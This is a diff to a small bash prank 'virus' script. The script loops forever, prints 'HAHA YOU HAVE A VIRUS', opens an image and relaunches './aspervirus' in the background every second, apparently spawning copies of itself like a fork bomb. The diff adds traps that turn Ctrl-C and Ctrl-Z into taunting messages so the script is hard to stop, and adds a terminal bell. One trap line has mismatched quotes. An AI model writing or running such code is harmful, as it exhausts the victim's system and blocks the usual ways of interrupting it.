@@ -1,9 +1,11 @@
 #!/bin/bash
-
+trap 'echo "UH UH UH YOU DIDN"T SAY THE MAGIC WORDS"' INT
+trap 'echo "NOT TODAY SON"' TSTP
 while true; 
 do 
 	echo "HAHA YOU HAVE A VIRUS";
-	open aspervirus.png &
+	open ./aspervirus.png
 	./aspervirus &
-	sleep 2; 
+	tput bel &
+	sleep 1; 
 done
